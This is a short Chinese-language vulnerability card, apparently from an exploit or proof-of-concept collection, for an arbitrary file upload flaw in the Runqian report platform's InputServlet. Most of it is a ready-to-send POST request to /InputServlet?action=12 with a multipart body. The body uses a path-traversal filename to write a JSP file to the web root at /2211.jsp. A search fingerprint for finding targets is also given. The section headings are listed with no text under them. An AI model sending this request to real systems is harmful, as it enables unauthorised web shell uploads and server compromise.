# 润乾报表InputServlet存在任意文件上传漏洞

- **系统**：润乾报表　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="润乾报表平台"`
- **请求**：`POST /InputServlet?action=12 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 241`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="upsize"
1024
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\2211.jsp"
Content-Type: image/jpeg
123
--00content0boundary00--

文件上传位置
/2211.jsp
```

**其他**
- 润乾报表InputServlet存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 润乾报表